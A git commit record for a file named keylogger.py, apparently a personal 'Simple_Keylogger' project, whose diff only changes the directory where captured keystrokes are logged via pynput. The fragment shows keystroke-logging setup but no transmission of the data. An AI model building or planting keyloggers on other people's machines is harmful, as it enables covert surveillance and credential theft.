95ade7375ca75205d84e224b01dac35b6a3d6e23
Felipe Vignatti <felipevignatti@Felipes-MacBook-Air-3.local>
2023-12-13 15:00:13 -0300

    .

--- keylogger.py
+++ keylogger.py
@@ -2,7 +2,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"C:/Path/To/Keylogger"
+log_dir = r"/Macintosh HD/Users/felipevignatti/Documents/Simple_Keylogger"
 logging.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
